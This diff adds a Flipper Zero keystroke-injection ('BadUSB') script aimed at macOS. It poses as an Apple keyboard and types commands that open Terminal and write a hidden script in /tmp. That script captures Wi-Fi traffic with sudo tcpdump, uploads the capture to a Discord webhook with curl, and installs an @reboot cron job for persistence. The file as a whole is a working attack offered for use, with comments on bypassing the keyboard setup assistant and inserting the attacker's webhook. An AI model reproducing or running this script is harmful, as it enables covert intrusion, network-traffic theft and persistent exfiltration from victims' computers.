@@ -1,0 +1,59 @@
+ID 05ac:021e Apple:Keyboard
+REM Keep these 3 lines IF (and only if) it's the first time you are performing a badKB attack against a specific macOS target.
+REM In fact, it helps Flipper Zero bypass the macOS keyboard setup assistant. Otherwise the attack will not start.
+REM Author: hector(sasquatchchicken)
+REM Version 1.0 (Flipper Ducky)
+REM Target: macOS
+DELAY 500
+F4
+DELAY 1000
+REM Open Terminal
+ENTER
+DELAY 1000
+REM Change directory
+STRING cd /tmp
+ENTER
+DELAY 500
+REM Create a directory with timestamp
+STRING mkdir hugo_$(date +'%d-%m-%y_%H%M%S')
+ENTER
+DELAY 500
+REM Change to the newly created directory
+STRING cd hugo_*
+ENTER
+DELAY 500
+REM Save the script to a file in the current directory
+STRING touch infinitydump.sh
+ENTER
+DELAY 1000
+STRING echo "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s; sudo tcpdump -n -i en1 -vvv -E 'wlan.fc.type_subtype == 0x08' -w infinitydump.pcap &" >> infinitydump.sh
+ENTER
+DELAY 1000
+STRING echo "DELAY 60000" >> infinitydump.sh
+ENTER
+DELAY 1000
+REM the provided script sequence, the action is intended to work continuously with persistence.  After the script is executed, it captures Wi-Fi traffic for 1 min, sends the captured data to Discord, and then continues to capture.
+REM make sure to place your webhook
+STRING echo "curl -F \"file1=@infinitydump.pcap\" https://discord.com/api/webhooks/" >> infinitydump.sh
+ENTER
+DELAY 1000
+REM Make the script executable
+STRING chmod +x infinitydump.sh
+ENTER
+DELAY 1000
+REM Set up cron job to run the script at reboot one more way to leverage persistence
+STRING echo "@reboot /tmp/hugo_*/infinitydump.sh" > cronjob
+ENTER
+DELAY 1000
+STRING crontab cronjob
+ENTER
+DELAY 1000
+REM Execute airport -s command to list available Wi-Fi networks, print the SSIDs, and dump the packets of the host to a file. 
+REM we use the '-w' in place of the > operator here because '>' gives sends a pcap that wireshark cannot read , '-w' resolves the issue.
+STRING /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s; sudo tcpdump -n -i en1 -vvv -E 'wlan.fc.type_subtype == 0x08' -w infinitydump.pcap &
+ENTER
+DELAY 60000
+REM the provided script sequence, the action is intended to work continuously with persistence.  After the script is executed, it captures Wi-Fi traffic for 1 min, sends the captured data to Discord, and then repeats the entire process.  
+REM Send data to Discord webhook and remember to put in your webhook 
+STRING curl -F "file1=@infinitydump.pcap" https://discord.com/api/webhooks/
+ENTER
